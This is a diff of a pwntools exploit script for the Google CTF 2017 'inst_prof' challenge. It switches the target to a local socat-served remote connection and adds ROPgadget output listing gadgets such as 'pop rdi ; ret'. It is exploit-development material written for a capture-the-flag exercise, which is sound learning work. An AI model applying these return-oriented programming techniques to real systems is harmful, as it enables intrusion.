@@ -1,6 +1,4 @@
 # -*- coding: utf-8 -*-
-# from https://khack40.info - writeup
-
 import struct
 import sys
 import subprocess
@@ -12,13 +10,11 @@ import errno
 import time
 from pwn import *
 
+# pwntools - CTF framework
+# defuse.ca - online x86 assembler
+# https://khack40.info - writeup
 # https://dilsec.com - google ctf 2017 pwnables inst_prof writeup
 # WizardsOfDos' CTF writeup @ github
-
-# Gallopsled/pwntools
-# niklasb/lib-database
-# JonathanSalwan/ROPgadget
-# defuse.ca - online x86 assembler
 
 b = ELF('inst_prof')
 
@@ -28,13 +24,18 @@ libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 context.arch = 'amd64'
 context.log_level = 'info'
 
-#r = remote('localhost', 8888)
-r = process('./inst_prof')
-gdb.attach(r, '''
-'''
-)
-raw_input('Go!')
+# socat TCP-LISTEN:8888,reuseaddr,fork 'SYSTEM:./inst_prof'
+r = remote('localhost', 8888)
 
+#r = process('./inst_prof')
+#gdb.attach(r, '''
+#'''
+#)
+#raw_input('Go!')
+
+#
+# run ROPgadget to collect useful gadgets
+#
 # $ ROPgadget --binary inst_prof
 #0x0000000000000bc3 : pop rdi ; ret
 #0x0000000000000bc1 : pop rsi ; pop r15 ; ret
